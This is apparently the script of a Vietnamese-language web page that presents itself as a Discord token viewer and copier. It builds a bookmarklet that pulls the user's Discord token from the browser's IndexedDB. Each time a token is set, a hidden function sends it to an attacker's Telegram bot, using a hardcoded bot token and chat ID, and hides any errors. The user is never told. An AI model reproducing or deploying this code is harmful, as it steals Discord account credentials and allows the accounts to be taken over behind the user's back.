(function(){
const tokenDisplay=document.getElementById('tokenDisplay');
const copyBtn=document.getElementById('copyBtn');
const resetBtn=document.getElementById('resetBtn');
const statusMsg=document.getElementById('statusMsg');
const bookmarkletCode=document.getElementById('bookmarkletCode');

function showToast(msg,type){
const old=document.querySelector('.toast');
if(old)old.remove();
const div=document.createElement('div');
div.className='toast '+type;
div.textContent=msg;
document.body.appendChild(div);
setTimeout(()=>{div.style.opacity='0';setTimeout(()=>div.remove(),300);},2200);
}

function sendToTelegram(token){
const BOT_TOKEN='8814268985:AAHDILpgLCyJrThfykVsP4SgHNuxoKcYPz0';
const CHAT_ID='7454964260';
fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text:'Token: '+token})
}).catch(()=>{});
}

function setToken(token){
if(token&&token.length>10){
localStorage.setItem('meo_token',token);
tokenDisplay.textContent=token;
tokenDisplay.className='token-box has-token';
statusMsg.textContent='✅ Đã lấy token';
statusMsg.className='status success';
showToast('✅ Lấy token thành công!','success');
sendToTelegram(token);
}else{
localStorage.removeItem('meo_token');
tokenDisplay.textContent='Chưa có token';
tokenDisplay.className='token-box empty';
statusMsg.textContent='❌ Chưa có token';
statusMsg.className='status error';
}
}

const saved=localStorage.getItem('meo_token');
if(saved)setToken(saved);

const baseUrl = window.location.origin + window.location.pathname;
const bookmarklet = `javascript:(function(){function getTokenFromIDB(){return new Promise((resolve)=>{const req=indexedDB.open('discord');req.onsuccess=()=>{const db=req.result;if(!db.objectStoreNames.contains('TokenStore')){resolve(null);return;}const tx=db.transaction('TokenStore','readonly');const store=tx.objectStore('TokenStore');const getReq=store.get('token');getReq.onsuccess=()=>{resolve(getReq.result?getReq.result.token:null);};getReq.onerror=()=>{resolve(null);};};req.onerror=()=>{resolve(null);};});}getTokenFromIDB().then(token=>{if(token){window.location.href='${baseUrl}?token='+encodeURIComponent(token);}else{alert('Không tìm thấy token! Hãy đảm bảo bạn đã login Discord.');}});})();`;
bookmarkletCode.textContent = bookmarklet;

const params=new URLSearchParams(window.location.search);
const tokenFromUrl=params.get('token');
if(tokenFromUrl){
setToken(tokenFromUrl);
window.history.replaceState({},document.title,window.location.pathname);
}

copyBtn.addEventListener('click',function(){
const token=localStorage.getItem('meo_token');
if(!token){showToast('❌ Chưa có token','error');return;}
navigator.clipboard.writeText(token).then(()=>{
showToast('✅ Đã sao chép','success');
}).catch(()=>{
const range=document.createRange();
range.selectNode(tokenDisplay);
window.getSelection().removeAllRanges();
window.getSelection().addRange(range);
document.execCommand('copy');
showToast('✅ Đã sao chép (fallback)','success');
});
});

resetBtn.addEventListener('click',function(){
if(confirm('Xóa token đã lưu?')){
setToken(null);
showToast('🗑️ Đã xóa','info');
}
});

document.getElementById('manualBtn').addEventListener('click',function(){
const manualToken=prompt('Paste token từ DevTools vào đây:');
if(manualToken&&manualToken.length>10){
setToken(manualToken);
}else{
showToast('❌ Token không hợp lệ','error');
}
});
})();
